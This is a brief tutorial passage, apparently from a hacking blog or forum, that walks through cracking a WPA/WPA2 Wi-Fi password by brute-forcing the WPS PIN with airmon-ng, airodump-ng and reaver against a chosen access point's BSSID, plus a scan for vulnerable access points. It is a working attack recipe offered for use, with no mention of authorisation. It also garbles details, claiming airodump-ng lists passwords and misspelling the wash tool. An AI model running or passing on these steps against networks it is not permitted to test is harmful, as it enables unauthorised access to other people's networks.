$ airmon-ng start wlan0

$ airodump-ng mon0
It will lists the available wireless passwords, now copy the BSSID of the Access Point ( e.g : 00:11:28:32:49:55 )
Starting the attack type:

$ reaver -i mon0 -b 00:11:28:32:49:55

Now it will start testing bruteforcing the PIN number of the vulnerability WPS (which we have spoke about it), and it will show you the WPA/WPA2 Password in the end of the Crack.

Note: You can use walsh -i mon0 to scan for vulnerable Access Points.
